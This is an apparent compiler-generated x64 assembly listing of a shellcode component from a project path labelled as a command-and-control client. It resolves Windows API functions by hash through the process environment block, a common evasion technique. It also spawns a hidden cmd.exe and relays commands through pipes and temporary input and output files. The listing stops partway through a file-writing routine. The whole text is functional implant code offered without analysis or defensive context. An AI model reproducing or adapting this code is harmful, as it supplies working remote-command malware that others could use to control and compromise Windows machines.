; Listing generated by Microsoft (R) Optimizing Compiler Version 19.36.32532.0 

include listing.inc

INCLUDELIB OLDNAMES

PUBLIC	??_C@_0N@NHPEBOA@?6END_OF_CMD?6@		; `string'
PUBLIC	??_C@_0L@IJLKIHG@END_OF_CMD@			; `string'
PUBLIC	??_C@_04MKNBDEPB@exit@				; `string'
PUBLIC	g_hChildStd_OUT_Rd
PUBLIC	MAX_STRING
PUBLIC	g_hChildStd_OUT_Wr
PUBLIC	g_hChildStd_IN_Rd
PUBLIC	g_hChildStd_IN_Wr
EXTRN	AlignRSP:PROC
g_hChildStd_OUT_Rd DQ 01H DUP (?)
COMM	g_pathInputFile:BYTE:0118H
g_hChildStd_OUT_Wr DQ 01H DUP (?)
COMM	g_pathOutputFile:BYTE:0118H
g_hChildStd_IN_Rd DQ 01H DUP (?)
g_hChildStd_IN_Wr DQ 01H DUP (?)
_BSS	ENDS
MAX_STRING DD	01000H
CONST	ENDS
;	COMDAT ??_C@_04MKNBDEPB@exit@
CONST	SEGMENT
??_C@_04MKNBDEPB@exit@ DB 'exit', 00H			; `string'
CONST	ENDS
;	COMDAT ??_C@_0L@IJLKIHG@END_OF_CMD@
CONST	SEGMENT
??_C@_0L@IJLKIHG@END_OF_CMD@ DB 'END_OF_CMD', 00H	; `string'
CONST	ENDS
;	COMDAT ??_C@_0N@NHPEBOA@?6END_OF_CMD?6@
CONST	SEGMENT
??_C@_0N@NHPEBOA@?6END_OF_CMD?6@ DB 0aH, 'END_OF_CMD', 0aH, 00H ; `string'
CONST	ENDS
PUBLIC	ExecutePayload
PUBLIC	readCommandFileAndExecute
PUBLIC	deleteFile
PUBLIC	readFile
PUBLIC	fileExists
PUBLIC	writeFile
PUBLIC	initializeTempFilePaths
PUBLIC	ReadFromPipe
PUBLIC	my_strstr
PUBLIC	WriteToPipe
PUBLIC	CreatePipes
PUBLIC	CreateChildProcess
PUBLIC	simple_memcpy
PUBLIC	Begin
PUBLIC	GetProcAddressWithHash
PUBLIC	RtlSecureZeroMemory
PUBLIC	__xmm@000a0d21646c726f57202c6f6c6c6548
;	COMDAT pdata
pdata	SEGMENT
$pdata$ExecutePayload DD imagerel $LN90
	DD	imagerel $LN90+921
	DD	imagerel $unwind$ExecutePayload
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$readCommandFileAndExecute DD imagerel $LN27
	DD	imagerel $LN27+330
	DD	imagerel $unwind$readCommandFileAndExecute
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$deleteFile DD imagerel $LN4
	DD	imagerel $LN4+30
	DD	imagerel $unwind$deleteFile
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$readFile DD imagerel $LN7
	DD	imagerel $LN7+403
	DD	imagerel $unwind$readFile
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$fileExists DD imagerel $LN6
	DD	imagerel $LN6+43
	DD	imagerel $unwind$fileExists
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$writeFile DD imagerel $LN5
	DD	imagerel $LN5+181
	DD	imagerel $unwind$writeFile
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$initializeTempFilePaths DD imagerel $LN28
	DD	imagerel $LN28+239
	DD	imagerel $unwind$initializeTempFilePaths
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$ReadFromPipe DD imagerel $LN48
	DD	imagerel $LN48+373
	DD	imagerel $unwind$ReadFromPipe
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$WriteToPipe DD imagerel $LN19
	DD	imagerel $LN19+181
	DD	imagerel $unwind$WriteToPipe
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$CreatePipes DD imagerel $LN8
	DD	imagerel $LN8+161
	DD	imagerel $unwind$CreatePipes
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$CreateChildProcess DD imagerel $LN10
	DD	imagerel $LN10+230
	DD	imagerel $unwind$CreateChildProcess
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$GetProcAddressWithHash DD imagerel $LN36
	DD	imagerel $LN36+269
	DD	imagerel $unwind$GetProcAddressWithHash
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$RtlSecureZeroMemory DD imagerel $LN4
	DD	imagerel $LN4+27
	DD	imagerel $unwind$RtlSecureZeroMemory
pdata	ENDS
;	COMDAT __xmm@000a0d21646c726f57202c6f6c6c6548
CONST	SEGMENT
__xmm@000a0d21646c726f57202c6f6c6c6548 DB 'Hello, World!', 0dH, 0aH, 00H
CONST	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$RtlSecureZeroMemory DD 020501H
	DD	017405H
xdata	ENDS
;	COMDAT voltbl
voltbl	SEGMENT
_volmd	DB	019H
voltbl	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$GetProcAddressWithHash DD 0a1901H
	DD	077419H
	DD	066419H
	DD	055419H
	DD	043419H
	DD	0e0151219H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$CreateChildProcess DD 091b01H
	DD	021741bH
	DD	020641bH
	DD	01f341bH
	DD	01c011bH
	DD	05010H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$CreatePipes DD 040a01H
	DD	0a340aH
	DD	07006720aH
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$WriteToPipe DD 030901H
	DD	0880109H
	DD	03002H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$ReadFromPipe DD 0a1601H
	DD	0e5416H
	DD	0d3416H
	DD	0f0125216H
	DD	0d00ee010H
	DD	0600b700cH
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$initializeTempFilePaths DD 071701H
	DD	02d7417H
	DD	02c3417H
	DD	02a0117H
	DD	0500bH
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$writeFile DD 081701H
	DD	0e5417H
	DD	0d3417H
	DD	0e0137217H
	DD	060107011H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$fileExists DD 010401H
	DD	04204H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$readFile DD 091801H
	DD	0f011e218H
	DD	0d00de00fH
	DD	07009c00bH
	DD	030076008H
	DD	05006H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$deleteFile DD 020601H
	DD	030023206H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$readCommandFileAndExecute DD 0a1c01H
	DD	0b641cH
	DD	0a541cH
	DD	08341cH
	DD	0f018321cH
	DD	07014e016H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$ExecutePayload DD 0d2601H
	DD	04b7426H
	DD	04a6426H
	DD	0493426H
	DD	0420126H
	DD	0e016f018H
	DD	0c012d014H
	DD	05010H
xdata	ENDS
; Function compile flags: /Ogspy
;	COMDAT RtlSecureZeroMemory
_TEXT	SEGMENT
ptr$ = 8
cnt$ = 16
RtlSecureZeroMemory PROC				; COMDAT
; File C:\Program Files (x86)\Windows Kits\10\include\10.0.22621.0\um\winnt.h
; Line 21735
$LN4:
	mov	QWORD PTR [rsp+8], rdi
	mov	r8, rcx
; Line 21740
	mov	rdi, rcx
	xor	eax, eax
	mov	rcx, rdx
	rep stosb
; Line 21763
	mov	rdi, QWORD PTR [rsp+8]
	mov	rax, r8
	ret	0
RtlSecureZeroMemory ENDP
_TEXT	ENDS
; Function compile flags: /Ogspy
;	COMDAT GetProcAddressWithHash
_TEXT	SEGMENT
BaseDllName$ = 0
dwModuleFunctionHash$ = 32
GetProcAddressWithHash PROC				; COMDAT
; File C:\Users\omega_sayer\Documents\C2_Client\funWithShellcode\GetProcAddressWithHash.h
; Line 32
$LN36:
	mov	rax, rsp
	mov	QWORD PTR [rax+8], rbx
	mov	QWORD PTR [rax+16], rbp
	mov	QWORD PTR [rax+24], rsi
	mov	QWORD PTR [rax+32], rdi
	push	r14
	sub	rsp, 16
; Line 52
	mov	rax, QWORD PTR gs:96
	mov	ebp, ecx
; Line 66
	xor	r14d, r14d
	mov	rdx, QWORD PTR [rax+24]
	mov	r8, QWORD PTR [rdx+16]
$LN8@GetProcAdd:
; Line 68
	cmp	QWORD PTR [r8+48], r14
	je	$LN34@GetProcAdd
; Line 69
	mov	r9, QWORD PTR [r8+48]
	mov	edx, r14d
; Line 70
	movups	xmm0, XMMWORD PTR [r8+88]
; Line 75
	mov	r8, QWORD PTR [r8]
	movsxd	rax, DWORD PTR [r9+60]
	movdqu	XMMWORD PTR BaseDllName$[rsp], xmm0
	mov	r11d, DWORD PTR [rax+r9+136]
; Line 78
	test	r11d, r11d
	je	SHORT $LN8@GetProcAdd
; Line 84
	mov	rax, QWORD PTR BaseDllName$[rsp]
	shr	rax, 16
	cmp	r14w, ax
	jae	SHORT $LN5@GetProcAdd
	mov	rcx, QWORD PTR BaseDllName$[rsp+8]
	movzx	r10d, ax
$LL6@GetProcAdd:
; Line 90
	movsx	eax, BYTE PTR [rcx]
	ror	edx, 13
	cmp	BYTE PTR [rcx], 97			; 00000061H
	jl	SHORT $LN14@GetProcAdd
; Line 92
	add	edx, -32				; ffffffe0H
$LN14@GetProcAdd:
; Line 84
	add	edx, eax
	inc	rcx
	sub	r10, 1
	jne	SHORT $LL6@GetProcAdd
$LN5@GetProcAdd:
; Line 100
	lea	r10, QWORD PTR [r9+r11]
; Line 105
	mov	r11d, r14d
	mov	edi, DWORD PTR [r10+32]
	add	rdi, r9
	cmp	DWORD PTR [r10+24], r14d
	jbe	SHORT $LN8@GetProcAdd
$LL9@GetProcAdd:
; Line 108
	mov	esi, DWORD PTR [rdi]
	mov	ebx, r14d
	add	rsi, r9
; Line 109
	lea	rdi, QWORD PTR [rdi+4]
$LL12@GetProcAdd:
; Line 116
	movsx	ecx, BYTE PTR [rsi]
; Line 117
	inc	rsi
	ror	ebx, 13
	add	ebx, ecx
; Line 118
	test	cl, cl
	jne	SHORT $LL12@GetProcAdd
; Line 120
	lea	eax, DWORD PTR [rbx+rdx]
; Line 122
	cmp	eax, ebp
	je	SHORT $LN23@GetProcAdd
; Line 105
	inc	r11d
	cmp	r11d, DWORD PTR [r10+24]
	jb	SHORT $LL9@GetProcAdd
; Line 66
	jmp	$LN8@GetProcAdd
$LN23@GetProcAdd:
; Line 124
	mov	eax, DWORD PTR [r10+36]
	lea	ecx, DWORD PTR [r11+r11]
	add	rax, r9
; Line 125
	movzx	edx, WORD PTR [rcx+rax]
	mov	ecx, DWORD PTR [r10+28]
	add	rcx, r9
	mov	eax, DWORD PTR [rcx+rdx*4]
	add	rax, r9
	jmp	SHORT $LN1@GetProcAdd
$LN34@GetProcAdd:
; Line 131
	xor	eax, eax
$LN1@GetProcAdd:
; Line 132
	mov	rbx, QWORD PTR [rsp+32]
	mov	rbp, QWORD PTR [rsp+40]
	mov	rsi, QWORD PTR [rsp+48]
	mov	rdi, QWORD PTR [rsp+56]
	add	rsp, 16
	pop	r14
	ret	0
GetProcAddressWithHash ENDP
_TEXT	ENDS
; Function compile flags: /Ogspy
;	COMDAT Begin
_TEXT	SEGMENT
Begin	PROC						; COMDAT
; File C:\Users\omega_sayer\Documents\C2_Client\funWithShellcode\64BitHelper.h
; Line 9
	jmp	AlignRSP
Begin	ENDP
_TEXT	ENDS
; Function compile flags: /Ogspy
;	COMDAT simple_memcpy
_TEXT	SEGMENT
dest$ = 8
src$ = 16
count$dead$ = 24
simple_memcpy PROC					; COMDAT
; File C:\Users\omega_sayer\Documents\C2_Client\funWithShellcode\exec_hashed.c
; Line 88
	sub	rdx, rcx
	mov	r8d, 4
$LL4@simple_mem:
; Line 89
	mov	al, BYTE PTR [rdx+rcx]
	mov	BYTE PTR [rcx], al
	inc	rcx
	sub	r8, 1
	jne	SHORT $LL4@simple_mem
; Line 91
	ret	0
simple_memcpy ENDP
_TEXT	ENDS
; Function compile flags: /Ogspy
;	COMDAT CreateChildProcess
_TEXT	SEGMENT
piProcInfo$ = 80
siStartInfo$ = 112
sCMD$ = 240
CreateChildProcess PROC					; COMDAT
; File C:\Users\omega_sayer\Documents\C2_Client\funWithShellcode\exec_hashed.c
; Line 226
$LN10:
	mov	rax, rsp
	mov	QWORD PTR [rax+16], rbx
	mov	QWORD PTR [rax+24], rsi
	mov	QWORD PTR [rax+32], rdi
	push	rbp
	lea	rbp, QWORD PTR [rax-95]
	sub	rsp, 224				; 000000e0H
; Line 229
	mov	ecx, -2042639239			; 863fcc79H
	call	GetProcAddressWithHash
; Line 232
	mov	ecx, -1583809039			; a198fdf1H
	mov	rbx, rax
	call	GetProcAddressWithHash
	mov	rsi, rax
; Line 248
	mov	DWORD PTR sCMD$[rbp-137], 778333539	; 2e646d63H
; File C:\Program Files (x86)\Windows Kits\10\include\10.0.22621.0\um\winnt.h
; Line 21740
	xor	eax, eax
; File C:\Users\omega_sayer\Documents\C2_Client\funWithShellcode\exec_hashed.c
; Line 248
	mov	DWORD PTR sCMD$[rbp-133], 6649957	; 00657865H
; File C:\Program Files (x86)\Windows Kits\10\include\10.0.22621.0\um\winnt.h
; Line 21740
	lea	rdi, QWORD PTR piProcInfo$[rbp-137]
; File C:\Users\omega_sayer\Documents\C2_Client\funWithShellcode\exec_hashed.c
; Line 250
	xor	r9d, r9d
	xor	r8d, r8d
; File C:\Program Files (x86)\Windows Kits\10\include\10.0.22621.0\um\winnt.h
; Line 21740
	lea	edx, QWORD PTR [rax+104]
	lea	ecx, QWORD PTR [rax+24]
	rep stosb
	mov	ecx, edx
	lea	rdi, QWORD PTR siStartInfo$[rbp-137]
	rep stosb
; File C:\Users\omega_sayer\Documents\C2_Client\funWithShellcode\exec_hashed.c
; Line 242
	mov	rcx, QWORD PTR g_hChildStd_OUT_Wr
; Line 250
	lea	rax, QWORD PTR piProcInfo$[rbp-137]
	or	DWORD PTR siStartInfo$[rbp-77], 257	; 00000101H
	xor	edi, edi
	mov	QWORD PTR [rsp+72], rax
	lea	rax, QWORD PTR siStartInfo$[rbp-137]
	mov	QWORD PTR [rsp+64], rax
	mov	QWORD PTR siStartInfo$[rbp-41], rcx
	mov	QWORD PTR siStartInfo$[rbp-49], rcx
	mov	rcx, QWORD PTR g_hChildStd_IN_Rd
	mov	QWORD PTR [rsp+56], rdi
	mov	QWORD PTR [rsp+48], rdi
	mov	DWORD PTR siStartInfo$[rbp-137], edx
	lea	rdx, QWORD PTR sCMD$[rbp-137]
	mov	QWORD PTR siStartInfo$[rbp-57], rcx
	xor	ecx, ecx
	mov	DWORD PTR [rsp+40], 134217728		; 08000000H
	mov	DWORD PTR [rsp+32], 1
	mov	WORD PTR siStartInfo$[rbp-73], di
	call	rbx
; Line 261
	test	eax, eax
	je	SHORT $LN3@CreateChil
; Line 264
	mov	rcx, QWORD PTR piProcInfo$[rbp-137]
	call	rsi
; Line 265
	mov	rcx, QWORD PTR piProcInfo$[rbp-129]
	call	rsi
$LN3@CreateChil:
; Line 267
	lea	r11, QWORD PTR [rsp+224]
	mov	rbx, QWORD PTR [r11+24]
	mov	rsi, QWORD PTR [r11+32]
	mov	rdi, QWORD PTR [r11+40]
	mov	rsp, r11
	pop	rbp
	ret	0
CreateChildProcess ENDP
_TEXT	ENDS
; Function compile flags: /Ogspy
;	COMDAT CreatePipes
_TEXT	SEGMENT
saAttr$ = 32
CreatePipes PROC					; COMDAT
; File C:\Users\omega_sayer\Documents\C2_Client\funWithShellcode\exec_hashed.c
; Line 269
$LN8:
	mov	QWORD PTR [rsp+8], rbx
	push	rdi
	sub	rsp, 64					; 00000040H
; Line 272
	mov	ecx, 246402878				; 0eafcf3eH
	call	GetProcAddressWithHash
; Line 275
	mov	ecx, 483595210				; 1cd313caH
	mov	rdi, rax
	call	GetProcAddressWithHash
; Line 281
	and	QWORD PTR saAttr$[rsp+8], 0
; Line 284
	lea	r8, QWORD PTR saAttr$[rsp]
	xor	r9d, r9d
	mov	DWORD PTR saAttr$[rsp], 24
	lea	rdx, OFFSET FLAT:g_hChildStd_OUT_Wr
	mov	DWORD PTR saAttr$[rsp+16], 1
	lea	rcx, OFFSET FLAT:g_hChildStd_OUT_Rd
	mov	rbx, rax
	call	rdi
	test	eax, eax
	je	SHORT $LN5@CreatePipe
; Line 289
	mov	rcx, QWORD PTR g_hChildStd_OUT_Rd
	xor	r8d, r8d
	lea	edx, QWORD PTR [r8+1]
	call	rbx
	test	eax, eax
	je	SHORT $LN5@CreatePipe
; Line 294
	xor	r9d, r9d
	lea	r8, QWORD PTR saAttr$[rsp]
	lea	rdx, OFFSET FLAT:g_hChildStd_IN_Wr
	lea	rcx, OFFSET FLAT:g_hChildStd_IN_Rd
	call	rdi
	test	eax, eax
	je	SHORT $LN5@CreatePipe
; Line 299
	mov	rcx, QWORD PTR g_hChildStd_IN_Wr
	xor	r8d, r8d
	lea	edx, QWORD PTR [r8+1]
	call	rbx
$LN5@CreatePipe:
; Line 302
	mov	rbx, QWORD PTR [rsp+80]
	add	rsp, 64					; 00000040H
	pop	rdi
	ret	0
CreatePipes ENDP
_TEXT	ENDS
; Function compile flags: /Ogspy
;	COMDAT WriteToPipe
_TEXT	SEGMENT
endCmd$ = 48
buffer$ = 64
dwWritten$ = 1104
cmd$ = 1104
WriteToPipe PROC					; COMDAT
; File C:\Users\omega_sayer\Documents\C2_Client\funWithShellcode\exec_hashed.c
; Line 304
$LN19:
	push	rbx
	sub	rsp, 1088				; 00000440H
	mov	rbx, rcx
; Line 306
	mov	ecx, 1538152237				; 5bae572dH
	call	GetProcAddressWithHash
; Line 310
	mov	cl, BYTE PTR [rbx]
	xor	r8d, r8d
	mov	r10, rax
	test	cl, cl
	je	SHORT $LN3@WriteToPip
	xor	edx, edx
$LL2@WriteToPip:
	cmp	rdx, 1011				; 000003f3H
	jge	SHORT $LN3@WriteToPip
; Line 312
	inc	rbx
	mov	BYTE PTR buffer$[rsp+rdx], cl
	inc	r8d
	inc	rdx
	mov	cl, BYTE PTR [rbx]
	test	cl, cl
	jne	SHORT $LL2@WriteToPip
$LN3@WriteToPip:
; Line 315
	mov	eax, DWORD PTR ??_C@_0N@NHPEBOA@?6END_OF_CMD?6@+8
	xor	edx, edx
	movsd	xmm0, QWORD PTR ??_C@_0N@NHPEBOA@?6END_OF_CMD?6@
	mov	DWORD PTR endCmd$[rsp+8], eax
	mov	al, BYTE PTR ??_C@_0N@NHPEBOA@?6END_OF_CMD?6@+12
	mov	BYTE PTR endCmd$[rsp+12], al
	movsd	QWORD PTR endCmd$[rsp], xmm0
	movsxd	rcx, r8d
$LL6@WriteToPip:
; Line 316
	cmp	rcx, 1024				; 00000400H
	jge	SHORT $LN5@WriteToPip
; Line 318
	mov	al, BYTE PTR endCmd$[rsp+rdx]
	inc	r8d
	mov	BYTE PTR buffer$[rsp+rcx], al
	inc	rdx
	inc	rcx
	cmp	rdx, 12
	jl	SHORT $LL6@WriteToPip
$LN5@WriteToPip:
; Line 324
	and	QWORD PTR [rsp+32], 0
	lea	r9, QWORD PTR dwWritten$[rsp]
	mov	rcx, QWORD PTR g_hChildStd_IN_Wr
	lea	rdx, QWORD PTR buffer$[rsp]
	movsxd	rax, r8d
	mov	BYTE PTR buffer$[rsp+rax], 0
	call	r10
; Line 327
	add	rsp, 1088				; 00000440H
	pop	rbx
	ret	0
WriteToPipe ENDP
_TEXT	ENDS
; Function compile flags: /Ogspy
;	COMDAT my_strstr
_TEXT	SEGMENT
haystack$ = 8
needle$dead$ = 16
my_strstr PROC						; COMDAT
; File C:\Users\omega_sayer\Documents\C2_Client\funWithShellcode\exec_hashed.c
; Line 331
	xor	r9d, r9d
	cmp	BYTE PTR [rcx], r9b
	je	SHORT $LN3@my_strstr
	lea	r10, OFFSET FLAT:??_C@_0L@IJLKIHG@END_OF_CMD@
	mov	rdx, rcx
	sub	rdx, r10
$LL4@my_strstr:
; Line 333
	mov	rax, r10
$LL5@my_strstr:
; Line 334
	mov	r8b, BYTE PTR [rax]
	test	r8b, r8b
	je	SHORT $LN12@my_strstr
	cmp	BYTE PTR [rdx+rax], r8b
	jne	SHORT $LN6@my_strstr
; Line 336
	inc	rax
	cmp	BYTE PTR [rdx+rax], r9b
	jne	SHORT $LL5@my_strstr
$LN6@my_strstr:
; Line 338
	cmp	BYTE PTR [rax], r9b
	je	SHORT $LN12@my_strstr
; Line 331
	inc	rcx
	inc	rdx
	cmp	BYTE PTR [rcx], r9b
	jne	SHORT $LL4@my_strstr
$LN3@my_strstr:
; Line 340
	xor	eax, eax
; Line 341
	ret	0
$LN12@my_strstr:
; Line 338
	mov	rax, rcx
; Line 341
	ret	0
my_strstr ENDP
_TEXT	ENDS
; Function compile flags: /Ogspy
;	COMDAT ReadFromPipe
_TEXT	SEGMENT
dwRead$ = 96
ReadFromPipe PROC					; COMDAT
; File C:\Users\omega_sayer\Documents\C2_Client\funWithShellcode\exec_hashed.c
; Line 343
$LN48:
	mov	QWORD PTR [rsp+16], rbx
	mov	QWORD PTR [rsp+24], rbp
	push	rsi
	push	rdi
	push	r13
	push	r14
	push	r15
	sub	rsp, 48					; 00000030H
; Line 346
	mov	ecx, -1151361363			; bb5f9eadH
	call	GetProcAddressWithHash
; Line 349
	mov	ecx, 1418739419				; 54903edbH
	mov	r15, rax
	call	GetProcAddressWithHash
; Line 352
	mov	ecx, -1017144077			; c35f9cf3H
	mov	rdi, rax
	call	GetProcAddressWithHash
; Line 355
	mov	ecx, -131836079				; f8245751H
	mov	r14, rax
	call	GetProcAddressWithHash
	mov	rbp, rax
; Line 358
	call	rbp
	mov	r13d, 4096				; 00001000H
	mov	rcx, rax
	mov	r8d, r13d
	xor	edx, edx
	call	rdi
	mov	rbx, rax
; Line 359
	test	rax, rax
	jne	SHORT $LN8@ReadFromPi
$LN46@ReadFromPi:
; Line 408
	xor	eax, eax
	jmp	$LN1@ReadFromPi
$LN8@ReadFromPi:
; Line 363
	call	rbp
	mov	rcx, rax
	mov	r8, r13
	xor	edx, edx
	call	rdi
	mov	rdi, rax
; Line 364
	test	rax, rax
	jne	SHORT $LN9@ReadFromPi
; Line 366
	call	rbp
	mov	rcx, rax
	mov	r8, rbx
	xor	edx, edx
	call	r14
; Line 367
	jmp	SHORT $LN46@ReadFromPi
$LN9@ReadFromPi:
; Line 379
	mov	rcx, QWORD PTR g_hChildStd_OUT_Rd
	lea	r9, QWORD PTR dwRead$[rsp]
	and	QWORD PTR [rsp+32], 0
	mov	r8d, r13d
	mov	rdx, rdi
	call	r15
; Line 380
	test	eax, eax
	je	$LN44@ReadFromPi
	xor	esi, esi
$LN45@ReadFromPi:
	mov	eax, DWORD PTR dwRead$[rsp]
	lea	r8, OFFSET FLAT:??_C@_0L@IJLKIHG@END_OF_CMD@
	test	eax, eax
	je	$LN44@ReadFromPi
; Line 388
	xor	edx, edx
	test	eax, eax
	je	SHORT $LN6@ReadFromPi
$LL7@ReadFromPi:
; Line 390
	mov	cl, BYTE PTR [rdx+rdi]
	inc	edx
	mov	BYTE PTR [rsi+rbx], cl
	inc	rsi
	cmp	edx, DWORD PTR dwRead$[rsp]
	jb	SHORT $LL7@ReadFromPi
$LN6@ReadFromPi:
; Line 394
	mov	BYTE PTR [rsi+rbx], 0
; Line 397
	mov	rdx, rbx
; Line 331
	cmp	BYTE PTR [rbx], 0
	je	SHORT $LN43@ReadFromPi
; Line 394
	mov	rcx, rbx
	sub	rcx, r8
$LL17@ReadFromPi:
; Line 333
	mov	rax, r8
$LL18@ReadFromPi:
; Line 334
	mov	r8b, BYTE PTR [rax]
	test	r8b, r8b
	je	SHORT $LN42@ReadFromPi
	cmp	BYTE PTR [rcx+rax], r8b
	jne	SHORT $LN19@ReadFromPi
; Line 336
	inc	rax
	cmp	BYTE PTR [rcx+rax], 0
	jne	SHORT $LL18@ReadFromPi
$LN19@ReadFromPi:
; Line 338
	cmp	BYTE PTR [rax], 0
	je	SHORT $LN42@ReadFromPi
; Line 331
	inc	rdx
	lea	r8, OFFSET FLAT:??_C@_0L@IJLKIHG@END_OF_CMD@
	inc	rcx
	cmp	BYTE PTR [rdx], 0
	jne	SHORT $LL17@ReadFromPi
; Line 398
	jmp	SHORT $LN43@ReadFromPi
$LN42@ReadFromPi:
	test	rdx, rdx
	jne	SHORT $LN29@ReadFromPi
$LN43@ReadFromPi:
; Line 379
	mov	rcx, QWORD PTR g_hChildStd_OUT_Rd
	lea	r9, QWORD PTR dwRead$[rsp]
	and	QWORD PTR [rsp+32], 0
	mov	r8d, r13d
	mov	rdx, rdi
	call	r15
; Line 380
	test	eax, eax
	je	SHORT $LN44@ReadFromPi
	jmp	$LN45@ReadFromPi
$LN29@ReadFromPi:
; Line 400
	mov	BYTE PTR [rdx], 0
$LN44@ReadFromPi:
; Line 405
	call	rbp
	mov	rcx, rax
	mov	r8, rdi
	xor	edx, edx
	call	r14
; Line 407
	mov	rax, rbx
$LN1@ReadFromPi:
; Line 408
	mov	rbx, QWORD PTR [rsp+104]
	mov	rbp, QWORD PTR [rsp+112]
	add	rsp, 48					; 00000030H
	pop	r15
	pop	r14
	pop	r13
	pop	rdi
	pop	rsi
	ret	0
ReadFromPipe ENDP
_TEXT	ENDS
; Function compile flags: /Ogspy
;	COMDAT initializeTempFilePaths
_TEXT	SEGMENT
sINPUT$ = 32
sOUTPUT$ = 48
tempPath$ = 64
initializeTempFilePaths PROC				; COMDAT
; File C:\Users\omega_sayer\Documents\C2_Client\funWithShellcode\exec_hashed.c
; Line 416
$LN28:
	mov	QWORD PTR [rsp+8], rbx
	mov	QWORD PTR [rsp+16], rdi
	push	rbp
	lea	rbp, QWORD PTR [rsp-80]
	sub	rsp, 336				; 00000150H
; Line 419
	mov	ecx, -464915664				; e449f330H
	call	GetProcAddressWithHash
; Line 425
	lea	rdx, QWORD PTR tempPath$[rsp]
	mov	DWORD PTR sINPUT$[rsp], 1970302569	; 75706e69H
	mov	ecx, 260				; 00000104H
	mov	DWORD PTR sINPUT$[rsp+4], 2020879988	; 78742e74H
	mov	bl, 105					; 00000069H
	mov	WORD PTR sINPUT$[rsp+8], 116		; 00000074H
	mov	dil, 111				; 0000006fH
	mov	DWORD PTR sOUTPUT$[rsp], 1886680431	; 7074756fH
	mov	DWORD PTR sOUTPUT$[rsp+4], 1949201525	; 742e7475H
	mov	WORD PTR sOUTPUT$[rsp+8], 29816		; 00007478H
	mov	BYTE PTR sOUTPUT$[rsp+10], 0
	call	rax
; Line 432
	mov	cl, BYTE PTR tempPath$[rsp]
	lea	rax, OFFSET FLAT:g_pathInputFile
	test	cl, cl
	je	SHORT $LN3@initialize
; Line 433
	lea	r8, QWORD PTR tempPath$[rsp]
	mov	dl, cl
	sub	r8, rax
$LL2@initialize:
	mov	BYTE PTR [rax], dl
	inc	rax
	mov	dl, BYTE PTR [r8+rax]
	test	dl, dl
	jne	SHORT $LL2@initialize
$LN3@initialize:
; Line 435
	lea	rdx, QWORD PTR sINPUT$[rsp]
	sub	rdx, rax
$LL4@initialize:
; Line 437
	mov	BYTE PTR [rax], bl
	inc	rax
	mov	bl, BYTE PTR [rdx+rax]
	test	bl, bl
	jne	SHORT $LL4@initialize
; Line 439
	mov	BYTE PTR [rax], bl
; Line 443
	lea	rax, OFFSET FLAT:g_pathOutputFile
; Line 444
	test	cl, cl
	je	SHORT $LN7@initialize
; Line 445
	lea	rdx, QWORD PTR tempPath$[rsp]
	sub	rdx, rax
$LL6@initialize:
	mov	BYTE PTR [rax], cl
	inc	rax
	mov	cl, BYTE PTR [rdx+rax]
	test	cl, cl
	jne	SHORT $LL6@initialize
$LN7@initialize:
; Line 447
	lea	rcx, QWORD PTR sOUTPUT$[rsp]
	sub	rcx, rax
$LL8@initialize:
; Line 449
	mov	BYTE PTR [rax], dil
	inc	rax
	mov	dil, BYTE PTR [rcx+rax]
	test	dil, dil
	jne	SHORT $LL8@initialize
; Line 452
	lea	r11, QWORD PTR [rsp+336]
	mov	BYTE PTR [rax], dil
	mov	rbx, QWORD PTR [r11+16]
	mov	rdi, QWORD PTR [r11+24]
	mov	rsp, r11
	pop	rbp
	ret	0
initializeTempFilePaths ENDP
_TEXT	ENDS
; Function compile flags: /Ogspy
;	COMDAT writeFile
_TEXT	SEGMENT
filePath$dead$ = 96
bytesWritten$1 = 96
data$ = 104
writeFile PROC						; COMDAT
; File C:\Users\omega_sayer\Documents\C2_Client\funWithShellcode\exec_hashed.c
; Line 454
$LN5:
	mov	QWORD PTR [rsp+16], rbx
	mov	QWORD PTR [rsp+24], rbp
	mov	QWORD PTR [rsp+8], rcx
	push	rsi
	push	rdi
	push	r14
	sub	rsp, 64					; 00000040H
; Line 457
	mov	ecx, 1339750106				; 4fdaf6daH
	mov	rdi, rdx
	call	GetProcAddressWithHash
; Line 460
	mov	ecx, 1538152237				; 5bae572dH
	mov	rbx, rax
	call	GetProcAddressWithHash
; Line 463
	mov	ecx, -863108876				; cc8e00f4H
	mov	rsi, rax
	call	GetProcAddressWithHash
; Line 468
	mov	ecx, -1583809039			; a198fdf1H
	mov	rbp, rax
	call	GetProcAddressWithHash
; Line 470
	and	QWORD PTR [rsp+48], 0
	lea	rcx, OFFSET FLAT:g_pathOutputFile
	mov	DWORD PTR [rsp+40], 128			; 00000080H
	xor	r9d, r9d
	xor	r8d, r8d
	mov	DWORD PTR [rsp+32], 2
	mov	edx, 1073741824				; 40000000H
	mov	r14, rax
	call	rbx
	mov	rbx, rax
; Line 471
	cmp	rax, -1
	je	SHORT $LN2@writeFile
; Line 473
	mov	rcx, rdi
	call	rbp
	and	QWORD PTR [rsp+32], 0
	lea	r9, QWORD PTR bytesWritten$1[rsp]
	mov	r8d, eax
	mov	rdx, rdi
